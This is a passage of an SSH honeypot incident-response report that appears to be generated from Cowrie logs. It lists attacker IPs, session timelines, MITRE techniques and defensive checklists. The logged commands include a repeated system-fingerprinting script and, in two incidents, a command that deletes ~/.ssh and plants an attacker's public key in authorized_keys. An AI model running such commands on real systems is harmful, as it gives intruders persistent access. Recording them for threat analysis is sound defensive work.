| `2026-08-16 10:10:39` | `cowrie.command.input` |
| `2026-08-16 10:10:40` | `cowrie.log.closed` |
| `2026-08-16 10:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63697fee1ffc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:12 |
| **Last Seen** | 2026-08-16 10:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:12:08` | `cowrie.session.connect` |
| `2026-08-16 10:12:08` | `cowrie.client.version` |
| `2026-08-16 10:12:08` | `cowrie.client.kex` |
| `2026-08-16 10:12:10` | `cowrie.login.success` |
| `2026-08-16 10:12:11` | `cowrie.session.params` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.success` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.command.input` |
| `2026-08-16 10:12:11` | `cowrie.log.closed` |
| `2026-08-16 10:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50d0665e873b

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-08-16 10:12 |
| **Last Seen** | 2026-08-16 10:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:12:41` | `cowrie.session.connect` |
| `2026-08-16 10:12:42` | `cowrie.client.version` |
| `2026-08-16 10:12:42` | `cowrie.client.kex` |
| `2026-08-16 10:12:45` | `cowrie.login.success` |
| `2026-08-16 10:12:46` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4fc12b66d7

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 10:12 |
| **Last Seen** | 2026-08-16 10:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:12:49` | `cowrie.session.connect` |
| `2026-08-16 10:12:49` | `cowrie.client.version` |
| `2026-08-16 10:12:49` | `cowrie.client.kex` |
| `2026-08-16 10:12:50` | `cowrie.login.success` |
| `2026-08-16 10:12:51` | `cowrie.session.params` |
| `2026-08-16 10:12:51` | `cowrie.command.input` |
| `2026-08-16 10:12:51` | `cowrie.log.closed` |
| `2026-08-16 10:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d13ac0bcce8

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-08-16 10:12 |
| **Last Seen** | 2026-08-16 10:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:12:51` | `cowrie.session.connect` |
| `2026-08-16 10:12:52` | `cowrie.client.version` |
| `2026-08-16 10:12:52` | `cowrie.client.kex` |
| `2026-08-16 10:12:54` | `cowrie.login.success` |
| `2026-08-16 10:12:55` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0b11f838cb

| Field | Detail |
|---|---|
| **Source IP** | `222.92.61[.]242` |
| **First Seen** | 2026-08-16 10:12 |
| **Last Seen** | 2026-08-16 10:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:12:55` | `cowrie.session.connect` |
| `2026-08-16 10:12:56` | `cowrie.client.version` |
| `2026-08-16 10:12:56` | `cowrie.client.kex` |
| `2026-08-16 10:12:58` | `cowrie.login.success` |
| `2026-08-16 10:12:59` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc39d376fc42

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:13 |
| **Last Seen** | 2026-08-16 10:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:13:38` | `cowrie.session.connect` |
| `2026-08-16 10:13:38` | `cowrie.client.version` |
| `2026-08-16 10:13:38` | `cowrie.client.kex` |
| `2026-08-16 10:13:40` | `cowrie.login.success` |
| `2026-08-16 10:13:42` | `cowrie.session.params` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.success` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.command.input` |
| `2026-08-16 10:13:42` | `cowrie.log.closed` |
| `2026-08-16 10:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9992449ab7b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:15 |
| **Last Seen** | 2026-08-16 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:15:04` | `cowrie.session.connect` |
| `2026-08-16 10:15:05` | `cowrie.client.version` |
| `2026-08-16 10:15:05` | `cowrie.client.kex` |
| `2026-08-16 10:15:07` | `cowrie.login.success` |
| `2026-08-16 10:15:08` | `cowrie.session.params` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.success` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.command.input` |
| `2026-08-16 10:15:08` | `cowrie.log.closed` |
| `2026-08-16 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8b0c7f5c33

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-08-16 10:15 |
| **Last Seen** | 2026-08-16 10:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:15:42` | `cowrie.session.connect` |
| `2026-08-16 10:15:42` | `cowrie.client.version` |
| `2026-08-16 10:15:42` | `cowrie.client.kex` |
| `2026-08-16 10:15:43` | `cowrie.login.success` |
| `2026-08-16 10:15:44` | `cowrie.session.params` |
| `2026-08-16 10:15:44` | `cowrie.command.input` |
| `2026-08-16 10:15:44` | `cowrie.command.failed` |
| `2026-08-16 10:15:44` | `cowrie.log.closed` |
| `2026-08-16 10:15:45` | `cowrie.session.params` |
| `2026-08-16 10:15:45` | `cowrie.command.input` |
| `2026-08-16 10:15:45` | `cowrie.session.file_download` |
| `2026-08-16 10:15:45` | `cowrie.log.closed` |
| `2026-08-16 10:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3e8651a6cdd

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-08-16 10:15 |
| **Last Seen** | 2026-08-16 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:15:45` | `cowrie.session.connect` |
| `2026-08-16 10:15:45` | `cowrie.client.version` |
| `2026-08-16 10:15:45` | `cowrie.client.kex` |
| `2026-08-16 10:15:46` | `cowrie.login.success` |
| `2026-08-16 10:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9111c7639f

| Field | Detail |
|---|---|
| **Source IP** | `201.76.120[.]30` |
| **First Seen** | 2026-08-16 10:15 |
| **Last Seen** | 2026-08-16 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:15:46` | `cowrie.session.connect` |
| `2026-08-16 10:15:46` | `cowrie.client.version` |
| `2026-08-16 10:15:46` | `cowrie.client.kex` |
| `2026-08-16 10:15:47` | `cowrie.login.success` |
| `2026-08-16 10:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.76.120[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.76.120[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7750c5a309

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:16 |
| **Last Seen** | 2026-08-16 10:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:16:29` | `cowrie.session.connect` |
| `2026-08-16 10:16:29` | `cowrie.client.version` |
| `2026-08-16 10:16:29` | `cowrie.client.kex` |
| `2026-08-16 10:16:31` | `cowrie.login.success` |
| `2026-08-16 10:16:32` | `cowrie.session.params` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.success` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:32` | `cowrie.command.input` |
| `2026-08-16 10:16:33` | `cowrie.log.closed` |
| `2026-08-16 10:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f914b7fba96e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:17 |
| **Last Seen** | 2026-08-16 10:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:17:55` | `cowrie.session.connect` |
| `2026-08-16 10:17:55` | `cowrie.client.version` |
| `2026-08-16 10:17:55` | `cowrie.client.kex` |
| `2026-08-16 10:17:57` | `cowrie.login.success` |
| `2026-08-16 10:17:58` | `cowrie.session.params` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.success` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.command.input` |
| `2026-08-16 10:17:58` | `cowrie.log.closed` |
| `2026-08-16 10:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5a902f58628

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-16 10:18 |
| **Last Seen** | 2026-08-16 10:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:18:39` | `cowrie.session.connect` |
| `2026-08-16 10:18:39` | `cowrie.client.version` |
| `2026-08-16 10:18:39` | `cowrie.client.kex` |
| `2026-08-16 10:18:40` | `cowrie.login.success` |
| `2026-08-16 10:18:41` | `cowrie.session.params` |
| `2026-08-16 10:18:41` | `cowrie.command.input` |
| `2026-08-16 10:18:41` | `cowrie.command.failed` |
| `2026-08-16 10:18:41` | `cowrie.log.closed` |
| `2026-08-16 10:18:42` | `cowrie.session.params` |
| `2026-08-16 10:18:42` | `cowrie.command.input` |
| `2026-08-16 10:18:42` | `cowrie.session.file_download` |
| `2026-08-16 10:18:42` | `cowrie.log.closed` |
| `2026-08-16 10:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59fdf53356fb

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-16 10:18 |
| **Last Seen** | 2026-08-16 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:18:42` | `cowrie.session.connect` |
| `2026-08-16 10:18:42` | `cowrie.client.version` |
| `2026-08-16 10:18:42` | `cowrie.client.kex` |
| `2026-08-16 10:18:43` | `cowrie.login.success` |
| `2026-08-16 10:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb7eb2854e4

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-16 10:18 |
| **Last Seen** | 2026-08-16 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:18:43` | `cowrie.session.connect` |
| `2026-08-16 10:18:43` | `cowrie.client.version` |
| `2026-08-16 10:18:44` | `cowrie.client.kex` |
| `2026-08-16 10:18:44` | `cowrie.login.success` |
| `2026-08-16 10:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47f117d12d6c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:19 |
| **Last Seen** | 2026-08-16 10:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:19:25` | `cowrie.session.connect` |
| `2026-08-16 10:19:25` | `cowrie.client.version` |
| `2026-08-16 10:19:25` | `cowrie.client.kex` |
| `2026-08-16 10:19:26` | `cowrie.login.success` |
| `2026-08-16 10:19:28` | `cowrie.session.params` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.success` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.command.input` |
| `2026-08-16 10:19:28` | `cowrie.log.closed` |
| `2026-08-16 10:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-859a1d457888

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:21 |
| **Last Seen** | 2026-08-16 10:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

